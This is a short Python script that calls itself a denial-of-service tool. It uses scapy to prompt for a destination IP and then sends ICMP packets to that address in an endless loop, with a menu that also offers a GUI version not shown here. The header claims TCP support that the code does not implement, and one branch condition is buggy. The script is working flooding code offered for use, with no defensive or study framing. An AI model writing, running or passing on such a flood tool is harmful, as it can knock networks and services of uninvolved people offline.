# # Created in Python | 5/02/2024 | Denial of Service Tool | Supports TCP, ICMP at given date.
# Created by datarec

from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP
import subprocess
import time
import os
import banners
import gui

def gui_version():
    gui.main()


def cli_version():
    subprocess.run(["cls"], shell=True)
    banners.dos_banner()
    print('')
    print(' Enter the destination IP. ')
    ip_entry = input(' ENTER IP: ')
    prompt = input(' do you want to start the packet flood y/n?: ')
    if prompt == 'y':
        icmp_flood = IP(dst=ip_entry) / ICMP(type=9)
        send(icmp_flood, loop=True)
    elif 'n':
        main()


def main():
    subprocess.run(["cls"], shell=True)
    method_options = input('''
 Denial of Service tool | made by datarec
 
 1) GUI Version 
 2) CLI Version 

 >> ''')
    if method_options == '1':
        gui_version()
    elif method_options == '2':
        cli_version()
    else:
        print('Please select from the following using 1 or 2.')
        time.sleep(2)
        main()


def welcome_msg():
    try:
        subprocess.run(["cls"], shell=True)
        get_user = os.getlogin()
        print(f'\nWelcome {get_user}!')
        time.sleep(2)
        main()
    except KeyboardInterrupt:
        print(" \n\nExiting...")
        exit()
        


if __name__ == "__main__":
    welcome_msg()
